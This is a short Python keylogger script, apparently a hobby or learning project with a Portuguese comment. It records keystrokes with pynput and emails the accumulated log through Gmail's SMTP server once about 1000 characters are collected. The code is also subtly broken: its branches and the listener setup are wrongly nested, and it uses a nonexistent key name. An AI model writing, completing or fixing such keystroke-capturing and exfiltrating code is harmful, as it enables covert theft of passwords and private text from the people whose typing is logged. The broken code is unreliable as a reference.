import getpass
import smtplib 
from pynput.keyboard import Key, Listener

# email para envio
email = input('Enter your email: ')
password = input('Enter your password: ')
server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
server.login(email, password)

#logger
full_log = ''
word = ''
email_char_list = 1000

def on_press(key):
    global word
    global full_log
    global email
    global email_char_list

    if key == Key.space or key == Key.enter:
        word +=' '
        full_log += word
        word = ' '
        if len(full_log)>= email_char_list:
            send_log()
            full_log= ''
        elif key == Key.shift_1 or key ==Key.shift_r:
            return
        elif key == Key.backspace:
            word = word[:-1]
        else:
            char = f'{key}'
            char = char [1:-1]
            word += char

        if key == Key.esc:
            return False

        
    def send_log():
        server.sendmail(
            email,
            email,
            full_log
        )


    with Listener( on_press=on_press) as listener:
        listener.join()